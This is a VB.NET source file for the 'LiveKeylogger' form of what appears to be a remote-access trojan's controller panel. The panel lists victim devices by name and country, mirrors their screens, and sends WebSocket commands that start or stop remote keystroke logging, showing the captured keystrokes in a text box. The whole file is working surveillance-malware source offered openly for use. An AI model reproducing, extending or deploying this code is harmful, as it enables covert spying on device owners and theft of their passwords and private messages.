Imports System.Net.Sockets

Public Class LiveKeylogger
    Public Btcli As BTClient
    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private Sub LiveKeylogger_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        Me.mytitle.Text = Keyloggerstr & " | " & Btcli.name & " | " & Btcli.country
        statetimer.Start()
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Keyloggerstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Keyloggerstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub LiveKeylogger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        stoper()
        statetimer.Stop()
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        textlog.Text = ""
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles scrolbtn.Click
        If scrolbtn.Tag = "1" Then
            scrolbtn.Tag = "0"
            scrolbtn.ForeColor = Color.White
            scrolbtn.RectColor = Color.White
        Else
            scrolbtn.Tag = "1"
            scrolbtn.ForeColor = Color.DeepSkyBlue
            scrolbtn.RectColor = Color.DeepSkyBlue
        End If
    End Sub

    Private Sub stopbtn_Click(sender As Object, e As EventArgs) Handles stopbtn.Click
        If Not stopbtn.Enabled Then
            Return
        End If
        stoper()
    End Sub

    Private Sub stoper()
        Dim data As New With {
            .subcommand = "V",
           .nstate = "0"
        }
        Dim commandstr As String = FormatCommand("Activitys", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", wrk},
                            {"cmnd", commandstr}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

        stopbtn.Enabled = False
        startbtn.Enabled = True
    End Sub

    Private Sub startbtn_Click(sender As Object, e As EventArgs) Handles startbtn.Click

        If Not startbtn.Enabled Then
            Return
        End If
        Dim data As New With {
            .subcommand = "V",
           .nstate = "1"
        }
        Dim commandstr As String = FormatCommand("Activitys", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", wrk},
                            {"cmnd", commandstr}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

        stopbtn.Enabled = True
        startbtn.Enabled = False
    End Sub

    Private Sub Panel4_Paint(sender As Object, e As PaintEventArgs) Handles Panel4.Paint

    End Sub
End Class